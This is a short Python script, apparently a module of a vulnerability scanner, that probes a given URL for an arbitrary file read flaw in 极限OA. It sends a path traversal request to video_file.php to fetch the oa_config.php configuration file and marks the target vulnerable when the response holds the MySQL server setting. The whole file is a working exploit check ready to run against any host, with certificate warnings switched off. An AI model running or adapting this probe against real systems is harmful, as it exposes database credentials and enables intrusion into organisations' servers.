#!/usr/bin/env python
# coding=utf-8
#极限OA任意文件读取漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        response = requests.get(
            url=url + '/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php', verify=False,
            timeout=20)
        if '$MYSQL_SERVER' in response.text:
            print(colored('[+]极限OA任意文件读取漏洞', 'red'))
            results = f'{url}-->极限OA任意文件读取漏洞'
        else:
            print('[-]不存在极限OA任意文件读取漏洞')
    except:
        print('[-]不存在极限OA任意文件读取漏洞')


def jixiangOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
